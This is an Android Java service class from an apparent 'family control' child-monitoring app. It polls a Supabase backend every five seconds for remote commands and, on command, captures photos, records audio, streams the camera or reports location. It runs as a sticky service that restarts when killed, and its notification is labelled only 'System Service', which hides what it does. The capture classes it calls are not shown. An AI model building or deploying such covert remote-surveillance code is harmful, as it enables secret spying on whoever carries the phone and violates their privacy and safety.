package com.familycontrol.child;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MonitoringService extends Service {
    
    private static final String TAG = "MonitoringService";
    private static final String CHANNEL_ID = "monitoring_channel";
    private static final int NOTIFICATION_ID = 1001;
    private static final int COMMAND_POLL_INTERVAL = 5000; // 5 seconds
    
    private Handler mainHandler;
    private ExecutorService executorService;
    private SupabaseClient supabaseClient;
    private CameraManager cameraManager;
    private AudioManager audioManager;
    private LocationManager locationManager;
    private String deviceId;
    private boolean isRunning = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        Log.d(TAG, "MonitoringService created");
        
        // Initialize components
        mainHandler = new Handler(Looper.getMainLooper());
        executorService = Executors.newFixedThreadPool(3);
        supabaseClient = new SupabaseClient(this);
        cameraManager = new CameraManager(this);
        audioManager = new AudioManager(this);
        locationManager = new LocationManager(this);
        
        // Generate unique device ID
        deviceId = generateDeviceId();
        
        // Create notification channel
        createNotificationChannel();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "MonitoringService started");
        
        if (!isRunning) {
            startForeground(NOTIFICATION_ID, createNotification());
            startMonitoring();
            isRunning = true;
        }
        
        return START_STICKY; // Restart if killed
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not a bound service
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "MonitoringService destroyed");
        
        isRunning = false;
        if (executorService != null) {
            executorService.shutdown();
        }
        
        // Update device status to offline
        updateDeviceStatus(false);
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System monitoring service");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build();
    }
    
    private void startMonitoring() {
        // Update device status to online
        updateDeviceStatus(true);
        
        // Start command polling
        startCommandPolling();
        
        Log.d(TAG, "Monitoring started for device: " + deviceId);
    }
    
    private void startCommandPolling() {
        mainHandler.post(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    // Poll for commands in background thread
                    executorService.execute(() -> {
                        try {
                            pollForCommands();
                        } catch (Exception e) {
                            Log.e(TAG, "Error polling commands", e);
                        }
                    });
                    
                    // Schedule next poll
                    mainHandler.postDelayed(this, COMMAND_POLL_INTERVAL);
                }
            }
        });
    }
    
    private void pollForCommands() {
        try {
            // Get pending commands from Supabase
            String commands = supabaseClient.getPendingCommands(deviceId);
            
            if (commands != null && !commands.isEmpty()) {
                processCommands(commands);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error in pollForCommands", e);
        }
    }
    
    private void processCommands(String commandsJson) {
        try {
            // Parse and execute commands
            // This is a simplified version - in real implementation, parse JSON properly
            Log.d(TAG, "Processing commands: " + commandsJson);
            
            if (commandsJson.contains("capture_image")) {
                executeCommand("capture_image", "");
            } else if (commandsJson.contains("record_audio")) {
                executeCommand("record_audio", "");
            } else if (commandsJson.contains("start_camera")) {
                executeCommand("start_camera", "");
            } else if (commandsJson.contains("stop_camera")) {
                executeCommand("stop_camera", "");
            } else if (commandsJson.contains("get_location")) {
                executeCommand("get_location", "");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing commands", e);
        }
    }
    
    private void executeCommand(String commandType, String commandData) {
        Log.d(TAG, "Executing command: " + commandType);
        
        executorService.execute(() -> {
            try {
                switch (commandType) {
                    case "capture_image":
                        cameraManager.captureImage();
                        break;
                    case "record_audio":
                        audioManager.startRecording();
                        break;
                    case "start_camera":
                        cameraManager.startCameraStream();
                        break;
                    case "stop_camera":
                        cameraManager.stopCameraStream();
                        break;
                    case "get_location":
                        locationManager.getCurrentLocation();
                        break;
                    default:
                        Log.w(TAG, "Unknown command: " + commandType);
                }
                
                // Mark command as executed
                supabaseClient.markCommandExecuted(commandType);
                
            } catch (Exception e) {
                Log.e(TAG, "Error executing command: " + commandType, e);
            }
        });
    }
    
    private void updateDeviceStatus(boolean isOnline) {
        executorService.execute(() -> {
            try {
                supabaseClient.updateDeviceStatus(deviceId, isOnline);
            } catch (Exception e) {
                Log.e(TAG, "Error updating device status", e);
            }
        });
    }
    
    private String generateDeviceId() {
        try {
            return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return "device_" + System.currentTimeMillis();
        }
    }
}

